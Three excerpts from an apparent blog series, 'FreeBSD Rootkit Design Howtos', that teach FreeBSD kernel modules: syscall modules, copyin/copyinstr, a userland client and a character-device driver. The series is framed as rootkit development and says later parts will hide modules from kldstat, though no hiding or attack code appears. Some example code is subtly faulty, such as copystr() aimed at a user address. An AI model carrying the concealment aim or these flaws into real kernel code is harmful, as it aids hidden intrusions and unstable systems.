//Check the parameter passed to the application,                      //print out usage help information                      //if we got wrong number of parameters.         printf(\"Usage:\\n%s &lt;string&gt;\\n\", argv[0]);         exit(0);     }      struct module_stat stat; //We'll get the module statues and store it here.     int syscall_num; //We'll get the offset value and store it here.       /* Determine sc_example's offset value. */     stat.version = sizeof(stat); //set version to sizeof(struct module_stat)     modstat(modfind(\"sys/sc_example\"), &amp;stat); //With prefix this time     syscall_num = stat.data.intval;      /* Call sc_example. */     return(syscall(syscall_num, argv[1])); //Return the statues of the system call }   Everything is the same except modstat(modfind(\"sys/sc_example\"), &amp;stat);. Now compile and run.   myBSD# gcc -o client client.c client.c: In function 'main': client.c:12: warning: incompatible implicit declaration of built-in function 'exit' myBSD# ./client Hey\\ Kernel!\\ What\\'s\\ Up\\? myBSD# dmesg | tail -n1 Hey Kernel! What's Up?   Yada! Our little client is doing it’s job and we’ve achieved our objectives by calling a system call module without knowing it’s offset value.

        "excerpt":"What’s up geeks, it’s good to see you again! This is the 4th tutorial on FreeBSD Kernel Rootkit Design Howtos. Check back everyday for new tutorials and examples.   Review   Well, in the previous session, we discussed about an upgraded version of client application to issue system calls. We used int modfind(const char *modname); to get the id of a kernel module by specifying module name, and then we successfully retrieved the module’s offset value by calling  int modstat(int modid, struct module_stat *stat); function. We learned that the offset value is actually stored as int intval; in typedef union modspecific which is a sub-union of struct module_stat.   I hope you still remember that we created our very first system call module that expects a string argument to be sent from user land application, and it will then print out the string received. You don’t have to recall the whole process since we’ll redo that in this session, what you do need to recall is that we made a mistake.      modern operating systems segregate it’s memory areas into user space and kernel space, code running in each section don’t directly access each other’s resources. The way we assign a user space structure pointer to a kernel space local variable  (uap = (struct sc_example_args *)syscall_args;) is unsafe and not recommended.    Now it’s time to deal with this problem and fix that example code.   Kernel and User Space Transition   Before we start fixing our example code, I’d like to talk a little bit more about kernel space and user space.   We all know that modern operating systems segregate their virtual memory into user space and kernel space, and commonly user-mode applications run in user space, and system kernel runs in kernel space. Now, the question is why, why such separation exists, what is its purpose.   Actually we can consider user space as isolated sand-boxes, it restricts user land applications so that they don’t mess up with each other’s resources, and most importantly, the kernel space.   As we know, the kernel is the core of any operating system that is in charge of hardware resource allocation, scheduling, I/O, process management, and all sorts of low level stuff. We want to maintain stability and security of the system, so we really don’t want poorly-designed user applications crashing the whole system or malicious user application to modify the behavior of the kernel.   Although it it restricted, but it’s possible for user space and kernel space to access each other’s virtual memory since such communications are necessary. We just have to make sure that we do these in a way that the impact on system stability and security are minimal.      User space CANNOT access kernel space, if you have to, issue a system call   Kernel space CAN access user space, because it literally owns everything of the system. However, it is recommended to copy memory area from user space to kernel space before access it, otherwise may result a fatal panic.      Look at the figure above, it simply says that user-mode applications can only access kernel resources via system calls, and the system call module will return a value or perform pre-defined actions. This is much safer than letting user-mode applications to freely modify kernel resources or calling kernel functions, either kernel resource changing or function calling are performed by pre-programmed and well-designed code running in kernel, which are considered safer and stabler.   The figure also says that kernel modules running in kernel space normally copy user space resources back to it’s own virtual memory area first, and then perform pre-defined actions to either return a value to user space or modify the resource content.   Copying user space resources back to kernel space before referring or modifying is safer and recommended because, if we refer to a user space resource directly from kernel space and it’s swapped out or not faulted in yet, we’ll trigger a fatal panic.   Now let’s figure out how to copy resources around virtual memory areas.   The COPY(9)   Open your terminal and run the following command to see the manpage for all copy functions   myBSD# man copy   Copy functions are copy, copyin, copyout, and copyinstr. What they generally do is      The copy functions are designed to copy contiguous data from one address to another. All but copystr() copy data from user-space to kernel-space or vice-versa.    I find these four function names a little bit confusing, so let me put a figure here to help you remember their usages.      The following is a list of all 4 copy functions definition and usage   copyin()   int copyin(const void *uaddr, void *kaddr, size_t len);   It copies len bytes of data from the user-space address uaddr to the kernel-space address kaddr.   copyout()   int copyout(const void *kaddr, void *uaddr, size_t len);   It copies len bytes of data from the kernel-space address kaddr to the user-space address uaddr.   copyinstr()   int copyinstr(const void *uaddr, void *kaddr, size_t len, size_t *done);   It copies a NUL-terminated string, at most len bytes long, from user-space address uaddr to kernel-space address kaddr. The number of bytes actually copied, including the terminating NUL, is returned in *done (if done is non-NULL).   copystr()   int copystr(const void *kfaddr, void *kdaddr, size_t len, size_t *done);   Copies a NUL-terminated string, at most len bytes long, from kernel-space address kaddr to kernel-space address kaddr. The number of bytes actually copied, including the terminating NUL, is returned in *done (if done is non-NULL).   The Copyin Functions   From the perspective of a system call module, we need to copy memory from user space to kernel space at most of the times. So that there are two copy functions we can utilize to achieve this task, copyin() and copyinstr().   It is necessary to talk about the difference between copyin() and copyinstr() before we choose which one to use for our upgraded example system call module.                          copyin()       copyinstr()                       Direction       From user space to kernel space       From user space to kernel space                 Resource Type       Any user space memory address       NUL-terminated string (ends with \\0)                 Copy Length       Exactly len bytes       At most len bytes long                 Extra Argument       NONE       size_t *done stores the number of bytes actually copied, including the terminating NUL                 Return Value       0 = success EFAULT = bad address       0 = success EFAULT = bad address                 Extra Return Value       ENAMETOOLONG = the string is longer than len bytes       ENAMETOOLONG = the string is longer than len bytes           As you can see from the table above, that these two functions perform basically same actions, but fits under different scenarios. As we need to copy a string from user space to kernel space in our example system call module, we are gonna use copyinstr() this time.   Example Code   Finally here comes our example code, just remember to include the two extra lib files.   /* * FILE: /root/rootkit/4.1/safe_sc_example.c * Example 4.1 * User and Kernel Space Transitions * FreeBSD Rootkit Design Howtos @ hailang.im */ #include &lt;sys/types.h&gt; #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/sysent.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/sysproto.h&gt;  /* The system call's arguments. */ struct sc_example_args {     char *str; };  /* The system call function. */ static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;      char kernstr[1024+1]; //This is the place holds a copy of the string in kernel space     int err = 0; //Return stat     size_t size = 0; //Size actually copied      err = copyinstr(uap-&gt;str, &amp;kernstr, 1024, &amp;size);     if (err == EFAULT)         return(err);      printf(\"Safer version output: %s\\n\",kernstr);     return (0); }  /* The sysent for the new system call */ static struct sysent sc_example_sysent = {     1,  /* number of arguments */     sc_example  /* implementing function */ };  /* The offset in sysent[] where the system call is to be allocated. */ static int offset = NO_SYSCALL;  /* The function called at load/unload. */ static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch(cmd) {     case MOD_LOAD:         uprintf(\"System call loaded at offset %d.\\n\", offset);         break;     case MOD_UNLOAD:         uprintf(\"System call unloaded from offset %d.\\n\", offset);         break;     default:         error = EOPNOTSUPP;         break;     }      return(error); }  SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, load, NULL);   Save the above code as safe_sc_example.c, and the following as makefile in the same directory   KMOD=   safe_sc_example SRCS=   safe_sc_example.c  .include &lt;bsd.kmod.mk&gt;   Now we can build our safer system call example by issuing make command   myBSD# make Warning: Object directory not changed from original /root/rootkit/4.1 @ -&gt; /usr/src/sys machine -&gt; /usr/src/sys/amd64/include x86 -&gt; /usr/src/sys/x86/include cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mno-sse -mcmodel=kernel -mno-red-zone -mno-mmx -msoft-float  -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions  -Wmissing-include-dirs -fdiagnostics-show-option   -c safe_sc_example.c ld  -d -warn-common -r -d -o safe_sc_example.ko safe_sc_example.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk safe_sc_example.ko  export_syms | xargs -J% objcopy % safe_sc_example.ko objcopy --strip-debug safe_sc_example.ko   Check if you have successfully built safe_sc_example.ko file, and load it into the running kernel by   myBSD# kldload ./safe_sc_example.ko System call loaded at offset 210.   Great, now you can use the client application we built in the previous session to make the system call. Just in case you feel as lazy as I do, here’s the client application code again,   #include &lt;stdio.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/module.h&gt;  int main(int argc, char *argv[]) //Main function of our client application {     if (argc != 2) { //Check the parameter passed to the application,                      //print out usage help information                      //if we got wrong number of parameters.         printf(\"Usage:\\n%s &lt;string&gt;\\n\", argv[0]);         exit(0);     }      struct module_stat stat; //We'll get the module statues and store it here.     int syscall_num; //We'll get the offset value and store it here.       /* Determine sc_example's offset value. */     stat.version = sizeof(stat); //set version to sizeof(struct module_stat)     modstat(modfind(\"sys/sc_example\"), &amp;stat); //With prefix this time     syscall_num = stat.data.intval;      /* Call sc_example. */     return(syscall(syscall_num, argv[1])); //Return the statues of the system call }   Save the source code in client.c and build it by   myBSD# gcc -o client client.c client.c: In function 'main': client.c:12: warning: incompatible implicit declaration of built-in function 'exit'   Now we can call our safer system call module example by   myBSD# ./client May\\ the\\ source\\ be\\ with\\ you myBSD# dmesg | tail -n 1 Safer version output: May the source be with you   This is great! We fine-tuned our system call module with the powerful copy functions, this should be enough for now. User and Kernel space transition is a very big topic, it involves many kernel design aspects and concepts, I cannot cover all of them in this short tutorial, but I’ll sure get back to this once we need to.

        "title": "FreeBSD Rootkit Design Howtos - 5 - Character Device First cdev Module",
        "excerpt":"Sup guys, welcome back to today’s FreeBSD Kernel Rootkit Design Howtos! I know it’s been a couple of days since I posted the previous note, I was dealing with my visa issue.   Review   We have discussed two types of kernel modules in the past 4 sessions: General Kernel Module, and System Call Kernel Module.   Hope you still remember that it took us 3 sessions to discuss the System Call Kernel Module and a tiny little client application, and lastly we discussed a little bit on Kernel/User Space Transitions.   So I guess that’d be enough for the System Call Kernel Module since we already know how to declare it, how to call it, and how to do it in a safe way.   And today we are gonna talk about a new type of kernel module – The Character Device Module, I hope you’ll enjoy.   The Device   Before we discuss what is a Character Device, let’s talk about what is a Device first.   A device is simply components connected with your motherboard, such as your hard disk, USB Drive, Handphone, or even Keyboard and Mouse.   You may have known that one of the most famous “characteristics” of unix-like systems, is  that In UNIX Everything is a File (This is a great article, check this out).   That’s true, and by Everything we mean documents, directories, links, network connections, terminals, inter-process communication, and devices.   All of these are represented as files in the unified local filesystem because they are treated as stream bytes, so you can read, write, lseek, and close them. So getting user input from the keyboard is simply read from the keyboard device file, very nice and clean right?   The benefit of this design is of course a simplified and unified API for all devices, and this was very advanced design back in the day when other operating systems required user to use different commands to copy files from different types of devices.   You get get a list of device files by entering ls /dev in a terminal. /dev is a specific implementation of filesystem called devfs in which all device files are stored and managed.   The Block Device and The Character Device   Now we know that we can interact with a device by accessing its device file, but what actually controls the behavior of a device?   The answer is in the kernel. Since firstly kernel should be the one dealing with hardware, and secondly the segregation between kernel modules can prevent a single hardware error from crashing the whole system.   That means if you are a device driver developer and you are about to work on a new hardware driver for most Unix-like systems, you’ll have to program a Device Kernel Module, and the module should follow the standard and create a file in devfs for users to interact with.   So that the concept of Device Kernel Module is similar to the concept of driver, except that in fact there are many different kinds of device kernel modules designed for different purposes. Here I’m gonna talk about two main types of modern unix-like system device kernel modules, the Block Device Module and the Character Device Module.                  Character Device       Block Device                       Transfers data directly to and from a user process       Disk devices for which the kernel provides caching                 Performs no buffering       Performs buffering and access randomly through a cache                 Read/Write 0 or more bytes in a stream       Read/Write fixed size blocks           Block devices are used to mount disk partitions in some other unix-like systems, and were used by FreeBSD as caching devices. The good news is, as you can see from FreeBSD Handbook: Block Devices, that the block device is deprecated by FreeBSD as a step to modernize the system design.   The caching part was moved upward and is now known as the vnode, so we totally don’t have to worry about block device here, but it’s still good idea to understand the differences between these two types of devices.   To conclude the above boring introduction, background, and design scenario, the Character Device Module, as the most common type of device driver, is simply just another type of kernel module that installs itself in the kernel and provide interface (devfs) represented as file to interact with users.   To successfully declare a character device module, there are three unique things we need to deal with first, we need to have a cdevsw structure, character device functions, and device registration routine. And of course, we’ll have to have an event handler and module declaration macro just like any other kernel modules.   The cdevsw Structure   Like what we have in a system call module, the cdevsw structure is a structure in which we store related information about the character device module, and this structure will be stored in a cdevsw structure table known as the character device switch table.   It works similarly to what we do with system call modules, we have a sysent structure to store some related information, and then we put that structure into the sysent[] table for further reference. So there should be no problem to understand this concept.   The cdevsw structure is defined in sys/conf.h as the following. I added some comments for quick reference.   FILE:/usr/src/sys/sys/conf.h /*  * Character device switch table  */ struct cdevsw {         int                     d_version;         u_int                   d_flags;    /* D_TAPE, D_DISK, D_TTY, D_MEM */         const char              *d_name;    /* Device name in /dev */         d_open_t                *d_open;    /* Func. pointer to dev open function */         d_fdopen_t              *d_fdopen;         d_close_t               *d_close;   /* Func. pointer to dev close function */         d_read_t                *d_read;    /* Func. pointer to dev read function */         d_write_t               *d_write;   /* Func. pointer to dev write function */         d_ioctl_t               *d_ioctl;   /* Func. pointer to dev ioctl (an operation other than a read or a write) function */         d_poll_t                *d_poll;    /* Polls a device to see if there is data to be read or space available for writing */         d_mmap_t                *d_mmap;         d_strategy_t            *d_strategy;         dumper_t                *d_dump;         d_kqfilter_t            *d_kqfilter;         d_purge_t               *d_purge;         d_mmap_single_t         *d_mmap_single;          int32_t                 d_spare0[3];         void                    *d_spare1[3];          /* These fields should not be messed with by drivers */         LIST_HEAD(, cdev)       d_devs;         int                     d_spare2;         union {                 struct cdevsw           *gianttrick;                 SLIST_ENTRY(cdevsw)     postfree_list;         } __d_giant; };   This may look very complicated, but actually there are just two parameters required to declare a character device, the *d_name and the d_version.   The *d_name is obvious the name of the character device module, and will be used to name the filename in /dev.   And the d_version specifies which FreeBSD version this character device module supports, it is defined in sys/conf.h as well.   FILE:/usr/src/sys/sys/conf.h /*  * Version numbers.  */ #define D_VERSION_00    0x20011966 #define D_VERSION_01    0x17032005      /* Add d_uid,gid,mode &amp; kind */ #define D_VERSION_02    0x28042009      /* Add d_mmap_single */ #define D_VERSION_03    0x17122009      /* d_mmap takes memattr,vm_ooffset_t */ #define D_VERSION       D_VERSION_03   The D_VERSION is the same as the latest d_version, so we’re gonna use this unless you want to have your character device module specifically run on a particular legacy version of FreeBSD.   So if you decide to be a superb lazy ass, the simplest definition of cdevsw structure can be,   static struct cdevsw cd_example_cdevsw = {     .d_version = D_VERSION,     .d_name =\"cd_example\" };   Unfortunately this character device module pretty much does nothing, despite that we are not required to define all of the functions such as *d_open or *d_close, we still need to have some of them to let our module at least do something.   The Character Device Functions   There are a lot of functions we can choose to implement in order to feature our module, but as I said, it does not require us to implement all of these listed functions in the definition of cdevsw structure.   Oh, FYI, for those functions that are not specified in the declaration of your module’s cdevsw structure, the operation will be considered as not supported.   static struct cdevsw cd_example_cdevsw = {     .d_version = D_VERSION,     .d_name =\"cd_example\",     .d_open = open,     .d_close = close,     .d_read = read,     .d_write = write };   In the example above, we explicitly said that we are gonna define a character device module named cd_example_cdevsw, and its gonna have four character device functions with their function pointers specified.   Take note that once we define a cdevsw structure with particular functions, the compiler will expect that function to be implemented, and will result in a compiling error if we fail to do this.   The prototypes of these functions are defined in the same file, sys/conf.h. Access the file for a complete list of all prototypes, I’m just gonna list down the four that we are using,   FILE:/usr/src/sys/sys/conf.h /*  * Character Device Function Prototypes.  */ typedef int d_open_t(struct cdev *dev, int oflags, int devtype, struct thread *td); typedef int d_close_t(struct cdev *dev, int fflag, int devtype, struct thread *td); typedef int d_read_t(struct cdev *dev, struct uio *uio, int ioflag); typedef int d_write_t(struct cdev *dev, struct uio *uio, int ioflag);   To quickly give you an overall understanding of how this works, we are gonna firstly create a read-only character device module. And by read-only, it means that we can only read stream bytes from the module which runs in the kernel back to the user space.   // Function prototype d_read_t read; //d_read_t is typedef'd in sys/conf.h  // Define a read-only device static struct cdevsw ro_cdevsw = {     .d_version = D_VERSION,     .d_read = read,     .d_name =\"cd_example_ro\" };  static char buf[512+1]; //A string in kernel space static size_t len;  int read(struct cdev *dev, struct uio *uio, int ioflag) {     int error = 0;     if (len &lt;= 0)         error = -1;     else         /* Return the saved character string to userland. */         copystr(&amp;buf, uio-&gt;uio_iov-&gt;iov_base, 513, &amp;len);      return(error); }   In order to implement the read function, we firstly defined it with the d_read_t prototype. Then we defined a cdevsw structure called ro_cdevsw with only one function pointer passed, the read function.   Now since we are gonna read a string from the kernel back to the user space, we at least need a string in the kernel, right? So we defined a string called buf[512+1].   Finally we reached the implementation of the read function, everything is usual except that we used copystr() here.   I hope you still remember that there are four copy functions, copyin(), copyinstr(), copyout(), and copystr(). All these four functions copy a continues data from kernel space to user space or vise versa except copystr(). copystr() function copies data from one kernel space address to another kernel space address. It is defined in sys/systm.h with following function prototype.   FILE: /usr/src/sys/sys/systm.h int     copystr(const void * __restrict kfaddr, void * __restrict kdaddr,             size_t len, size_t * __restrict lencopied)             __nonnull(1) __nonnull(2);   What we did with copystr(&amp;buf, uio-&gt;uio_iov-&gt;iov_base, 513, &amp;len); was to copy data from buf (which is a string in kernel space) to uio-&gt;uio_iov-&gt;iov_base which as a matter of fact, is also a kernel address, with maximum length 513, and save copied length to len.   It’s strange that we used copystr() function, ‘cause it copies data from kernel space address to another kernel space address, but we want to copy the buf[] string from kernel back to user space. This is obviously nothing like a read operation that we expected.   To answer this question, we have to take a look into the destination kernel space address  uio-&gt;uio_iov-&gt;iov_base that came out of nowhere.   In fact, the *uio structure does not came out of nowhere, it is actually defined in the read function prototype, and it was passed to our read function like this: int read(struct cdev *dev, struct uio *uio, int ioflag){}. That means every read action performed to a character device module from the user space needs to pass the *uio structure.   So now the question is, what is *uio, and why *uio. Here’s the definition of it in sys/uio.h.   FILE:/usr/src/sys/sys/uio.h struct uio {         struct  iovec *uio_iov;         /* scatter/gather list */         int     uio_iovcnt;             /* length of scatter/gather list */         off_t   uio_offset;             /* offset in target object */         ssize_t uio_resid;              /* remaining bytes to process */         enum    uio_seg uio_segflg;     /* address space */         enum    uio_rw uio_rw;          /* operation */         struct  thread *uio_td;         /* owner */ };   I’ll leave the why question to UIO(9) manpage, it says,      As a result of any read(2), write(2), readv(2), or writev(2) system call that is being passed to a character-device driver, the appropriate driver d_read or d_write entry will be called with a pointer to a struct uio being passed.     The transfer request is encoded in this structure. The driver itself should use uiomove() or  uiomove_nofault() to get at the data in this structure.    That means we’ve got to have uio passed to read() or write() function and then use uiomove() or uiomove_nofault() to,      The functions uiomove() and uiomove_nofault() are used to transfer data between buffers and I/O vectors that might possibly cross the user/kernel space boundary.    Now let’s take a look at iovec *uio_iov array. The I/O vector is defined in sys/_iovec.h   FILE:/usr/src/sys/sys/_iovec.h struct iovec {         void    *iov_base;      /* Base address. */         size_t   iov_len;       /* Length. */ };   Take note that the iov_base is the base address of the I/O vector, so by copystr(&amp;buf, uio-&gt;uio_iov-&gt;iov_base, 513, &amp;len); what we are really doing here is that we copied maximum 513 length of stream bytes from the starting address of the buffer string &amp;buf to the base address of I/O vector uio-&gt;uio_iov-&gt;iov_base.   We’ll get to the uiomove() function later, as for now, let’s discuss about the very last new thing we have to know to declare a character device module.   The Device Registration Routine   The registration of a device module is accomplished by calling the declaration module called DEV_MODULE. Before that, we need to have an event handler which defines the actions to be performed when the device module is loaded or unloaded.   This is simple, we call make_dev() function to register our character device module with kernel and create the device file in devfs when the module is loaded, and we call destroy_dev() function to unregister the module and remove the device file from /dev when the module is unloaded.   make_dev() function   FILE:/usr/src/sys/sys/conf.h struct cdev *make_dev(     struct cdevsw *_devsw, //pointer to cdevsw structure of the device module which was defined previously     int _unit, //Normally set to 0     uid_t _uid, //The owner ID of the device file     gid_t _gid, //The owner group ID of the device file     int _perms, //The permissions of the device file, e.g. 0600     const char *_fmt, //The name of the device ...) __printflike(6, 7);   This function is straight forward, we pass the cdevsw structure to the make_dev() function to finally get it registered into the character device switch table. What’s new is the return value of the function, which is a cdev structure. Well we’ve already discussed about the cdevsw structure, so what’s a cdev structure?   cdev structure   Let’s take a look at the definition of the cdev structure which is defined in sys/conf.h as shown below,   struct cdev {         void            *__si_reserved;         u_int           si_flags; #define SI_ETERNAL      0x0001  /* never destroyed */ #define SI_ALIAS        0x0002  /* carrier of alias name */ #define SI_NAMED        0x0004  /* make_dev{_alias} has been called */ #define SI_CHEAPCLONE   0x0008  /* can be removed_dev'ed when vnode reclaims */ #define SI_CHILD        0x0010  /* child of another struct cdev **/ #define SI_DEVOPEN      0x0020  /* opened by device */ #define SI_CONSOPEN     0x0040  /* opened by console */ #define SI_DUMPDEV      0x0080  /* is kernel dumpdev */ #define SI_CANDELETE    0x0100  /* can do BIO_DELETE */ #define SI_CLONELIST    0x0200  /* on a clone list */         struct timespec si_atime;         struct timespec si_ctime;         struct timespec si_mtime;         uid_t           si_uid;         gid_t           si_gid;         mode_t          si_mode;         struct ucred    *si_cred;       /* cached clone-time credential */         int             si_drv0;         int             si_refcount;         LIST_ENTRY(cdev)        si_list;         LIST_ENTRY(cdev)        si_clone;         LIST_HEAD(, cdev)       si_children;         LIST_ENTRY(cdev)        si_siblings;         struct cdev *si_parent;         char            *si_name;         void            *si_drv1, *si_drv2;         struct cdevsw   *si_devsw;         int             si_iosize_max;  /* maximum I/O size (for physio &amp;al) */         u_long          si_usecount;         u_long          si_threadcount;         union {                 struct snapdata *__sid_snapdata;         } __si_u;         char            __si_namebuf[SPECNAMELEN + 1]; };   This look scary, but we don’t have to worry about all these parameters. Since it is a returen value passed to us, we’ll have all necessary information set for us.   destroy_dev() function   Everything is just automagical, oh, except one thing – we have to explicitly define a cdev structure to receive the return value of the make_dev() function, since we’ll need to use it for our destroy_dev() function. The destroy_dev() function is defined in sys/conf.h as shown below,   FILE:/usr/src/sys/sys/conf.h void    destroy_dev(struct cdev *_dev);   This is superb simple, the destroy_dev() function will unregister the module and remove the device file in /dev, so it needs the cdev structure we just got from make_dev() function to get the module’s devfs information in order to destroy the device successfully.   Thus, we can update our example as the following,   // Function prototype d_read_t read; //d_read_t is typedef'd in sys/conf.h  // Define a read-only device static struct cdevsw ro_cdevsw = {     .d_version = D_VERSION,     .d_read = read,     .d_name =\"cd_example_ro\" };  int read(struct cdev *dev, struct uio *uio, int ioflag) {     uprintf(\"Read function called!n\"); }  /* Event Handler Code Here... */ ... static struct cdev *sdev; sdev = make_dev(&amp;ro_cdevsw, 0, UID_ROOT, GID_WHEEL, 0600, \"cd_example_ro\"); destroy_dev(sdev); ...  /* Declaration Macro Here... */ DEV_MODULE(...)   In the above example, we set the owner of the device to root, owner group to wheel, and permissions to 0600. A complete list of USER_IDs and GROUP_IDs are defined in sys/conf.h   FILE:/usr/src/sys/sys/conf.h #define         UID_ROOT        0 #define         UID_BIN         3 #define         UID_UUCP        66 #define         UID_NOBODY      65534  #define         GID_WHEEL       0 #define         GID_KMEM        2 #define         GID_TTY         4 #define         GID_OPERATOR    5 #define         GID_BIN         7 #define         GID_GAMES       13 #define         GID_DIALER      68 #define         GID_NOBODY      65534   DEV_MODULE macro   Here comes the last part of the device registration routine, the declaration macro. The definition of DEV_MODULE macro is in sys/conf.h as shown below,   FILE:/usr/src/sys/sys/conf.h #define DEV_MODULE(name, evh, arg)                                      \\ static moduledata_t name##_mod = {                                      \\     #name,                                                              \\     evh,                                                                \\     arg                                                                 \\ };                                                                      \\ DECLARE_MODULE(name, name##_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE)   Notice that when we use DEV_MODULE, it will automatically call the general DECLARE_MODULE with default module type and SI_SUB_DRIVERS, and the module position will be somewhere in the middle. So all we need to do is to specify the general name, the event handler function pointer, that’s all.   Connecting the dots   Now let’s connect all the pieces of code together to see how a character device register routine looks like.   // Function prototype d_read_t read; //d_read_t is typedef'd in sys/conf.h  // Define a read-only device static struct cdevsw ro_cdevsw = {     .d_version = D_VERSION,     .d_read = read,     .d_name =\"cd_example_ro\" };  static char buf[512+1]; //A string in kernel space static size_t len;  int read(struct cdev *dev, struct uio *uio, int ioflag) {     int error = 0;     if (len &lt;= 0)         error = -1;     else     /* Return the saved character string to userland. */         copystr(&amp;buf, uio-&gt;uio_iov-&gt;iov_base, 513, &amp;len);      return(error); }  /* Reference to the device in DEVFS */ static struct cdev *sdev;  static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch (cmd)     {         case MOD_LOAD:         sdev = make_dev(&amp;ro_cdevsw, 0, UID_ROOT, GID_WHEEL, 0600, \"cd_example_ro\");         uprintf(\"Character device loaded.n\"); break;          case MOD_UNLOAD: destroy_dev(sdev);         uprintf(\"Character device unloaded.n\"); break;          default: error = EOPNOTSUPP;         break;     }      return(error); }  DEV_MODULE(cd_example_ro, load, NULL);          #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/conf.h&gt; #include &lt;sys/uio.h&gt;  // Function prototypes d_open_t open; d_close_t close; d_read_t read; d_write_t write;  static struct cdevsw cd_example_cdevsw = {     .d_version = D_VERSION,     .d_open = open,     .d_close = close,     .d_read = read,     .d_write = write,     .d_name =\"cd_example\" };  static char buf[512+1]; //A string in kernel space static size_t len;  int open(struct cdev *dev, int flag, int otyp, struct thread *td) { /* Initialize character buffer. */ memset(&amp;buf, '�', 513); len = 0;  return(0); }  int close(struct cdev *dev, int flag, int otyp, struct thread *td) { return(0); }  int write(struct cdev *dev, struct uio *uio, int ioflag) { int error = 0;  /* * Take in a character string, saving it in buf. * Note: The proper way to transfer data between buffers and I/O * vectors that cross the user/kernel space boundary is with * uiomove(), but this way is shorter.

        "title": "FreeBSD Rootkit Design Howtos - 7 - Linker Files and Chapter Summary",
        "excerpt":"The book allocated a short section to describe the kldstat command once more before it ends the first chapter. So I’ll do this as well but with a little more information.   Linker Files   As we already know, that the kldstat command can give us a whole list of all loaded modules with their id, address, size, and module name. This is a simple and powerful tool for sysadmins, developers, and all kinds of other users, except that this might not be a lovely tool for rootkit developers (or let’s say low-level rootkit developers), ’cause people can easily detect your rootkit with only one command. But you know what, don’t you be worried, there are a whole bunch of techniques that the book will tell us to avoid your rootkit being listed in that list.   Let’s take a look at the manual page of kldstat.        kldstat [-v] [-i id] [-n filename]      kldstat [-q] [-m modname] ....  DESCRIPTION      The kldstat utility displays the status of any files dynamically linked      into the kernel.       The following options are available:       -v        Be more verbose.       -i id     Display the status of only the file with this ID.       -n filename                Display the status of only the file with this filename.       -q        Only check if module is loaded or compiled into the kernel.       -m modname                Display the status of only the module with this modname.   Let’s see some examples.

So here is the perfect oppoturnity to introduce linker files.           Let’s use zfs.ko as an example. The module file, zfs.ko, is actually the linker file for ZFS module and guides the module to be registered and linked with the kernel.            So that the parameters for kldload and kldunload are actually linker file names, NOT the module itself.            Submodules like zfsctrl is considered as the module, not a linker file anymore (Once it gets linked with kernel)            As such, every module is associated with one linker file, and one linker file can contain one or more than one module(s).       It is quite common to divide functionalities into different modules and use one linker file to register them with the kernel, we will discuss this later on.   Chapter Summary   Let’s take a look back to what we have learned in the first chapter, and list down all important points that are crucial to continue our discussions. Here’s a list of all the notes we have for the first chapter.   FreeBSD Rootkit Design Howtos - 1 - KLD First Kernel Loadable Module.           We started with the generic KLD with a simple ‘hello world!’ printing module,            and learned the concept of event handler using modeventhand_t(sys/module.h) with modeventtype(sys/module.h) provided,            and finally the the method to declare our module with DECLARE_MODULE(sys/module.h) with moduledata(sys/module.h), order(sys/kernel.h), and sub(sys/kernel.h) as parameters.       FreeBSD Rootkit Design Howtos - 2 - System Call First Kernel Service Module.           And then we started with system calls.            We get sy_call_t(sys/sysent.h) as system call function prototype,            and the SYSCALL_MODULE macro to register the module with            name, the general name for the module            offset(sys/sys/sysent.h), the offset of the system call’s sysent structure.            new_sysent(sys/sys/sysent.h), the sysent pointer to the complete sysent structure for the system call module.            evh, the event handler            and arg, the arguments            a sysent(sys/sysent.h) structure contains at least the number of arguments, and the function pointer to the implementation function.       FreeBSD Rootkit Design Howtos - 3 - System Call First Kernel Service Application.           Then we started with the application side of system call programming, which can be used to call the kernel service,            Firstly we need to find the module id with modfind(sys/module.h) function,            We can then get the module_stat(sys/module.h) back once we have the module id,            The module_stat(sys/module.h) structure contains a modspecific_t(sys/module.h), namely moduledata,            The intval is then retrieved from modspecific_t(sys/module.h) structure as the module offset value,            Then we can issue a syscall function with module offset value specified to call the kernel service.       FreeBSD Rootkit Design Howtos - 4 - Kernel and User Space Transitions.   -&gt;We learned 4 new functions which are defined in sys/systm.h, copyin(), copyout(), copyinstr(), and copystr().   -&gt;They can all be used to copy data from a continuous memory address to another,   -&gt;And all but copystr() copy data from user-space to kernel-space or vice-versa.   -&gt;These functions (except copystr()) are designed to copy data between user-space and kernel-space safely.   -&gt;Directly use reference to user-space at kernel-space or vice-versa is dangerous.   FreeBSD Rootkit Design Howtos - 5 - Character Device First cdev Module.           A new kernel module is introduced here, the character device module, it looks similar but not a system call module.            A cdevsw(sys/conf.h) known as character device switch table is needed when program a character device.            The cdevsw contains all basic info such as name and version, and also supported functions like open, read, and write.            The present of d_version, and d_name is a minimal requirement for a cdevsw structure.            A bunch of useful function prototypes are defined in sys/conf.h such as d_open_t(), d_close_t(), d_read_t(), and so on.            A cdev(sys/conf.h) structure is required to register the device module with kernel            make_dev(sys/conf.h) and destroy_dev(sys/conf.h) are used to register or unregister the module with cdev as reference.            The DEV_MODULE(sys/conf.h) Macro is then used to register the character device module with kernel.       FreeBSD Rootkit Design Howtos - 5 - Character Device First cdev Module.           This is rather a simple note,            We started with a refined version of previous character device module program by using copyinstr() instead of copystr() to make a safer transaction between kernel-space and user-space.            And then a client application to interact with character device is introduced.            open(), read(), write(), and close() were used to manipulate the character device module.       All right, this is pretty much everything we’ve covered in Chapter 1, 